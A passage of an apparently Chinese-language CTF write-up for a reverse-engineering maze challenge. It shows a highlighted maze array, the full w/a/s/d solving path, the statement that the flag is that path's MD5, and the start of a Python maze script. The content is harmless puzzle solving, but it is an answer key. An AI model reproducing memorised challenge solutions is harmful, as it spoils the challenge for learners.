punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span>  <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">]</span></code></pre><p>走一遍即可得出路径：<code>sssssddssddssaaaassssddwwddddssssssaawwaassssddssaassddddwwddssddwwwwwwwwaawwddwwwwaaaawwddwwwwddssssddwwwwddddwwddddssaassaassddddssddssaassssssddsssssss</code></p></li><li><p>将路径进行 MD5 加密后的结果就是 flag【<em>用在线工具时，留意回车字符，有时会导致结果不一样</em>】</p></li></ol><hr><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><pre class="language-python" data-language="python"><code class="language-python">maze <span class="token operator">=</span> <span class="token punctuation">[</span>   <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token 